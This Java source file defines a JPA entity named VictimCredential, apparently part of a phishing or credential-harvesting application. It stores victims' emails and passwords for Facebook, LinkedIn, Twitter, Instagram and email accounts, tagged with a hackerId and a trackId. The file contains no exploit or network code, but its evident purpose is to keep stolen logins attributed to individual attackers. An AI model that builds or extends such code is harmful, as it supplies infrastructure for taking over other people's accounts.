package com.hack.demo.entity;

import lombok.*;

import javax.persistence.*;

@Entity
@NoArgsConstructor
@AllArgsConstructor
@Setter
@Getter
@ToString
public class VictimCredential {

    @Transient
    public static final String FACEBOOK = "FACEBOOK", LINKEDIN =  "LINKEDIN", TWITTER = "TWITTER",
            INSTAGRAM = "INSTAGRAM", EMAIL = "EMAIL";



    @Id
    @GeneratedValue(strategy = GenerationType.SEQUENCE, generator = "victim_credential_sequence")
    @SequenceGenerator(name = "victim_credential_sequence", sequenceName = "victim_credential_sequence",
            allocationSize = 1)
    private long id;
    private String hackerId;
    private String trackId;
    private String email;
    private String password;
    private String time;
    private String type;

}
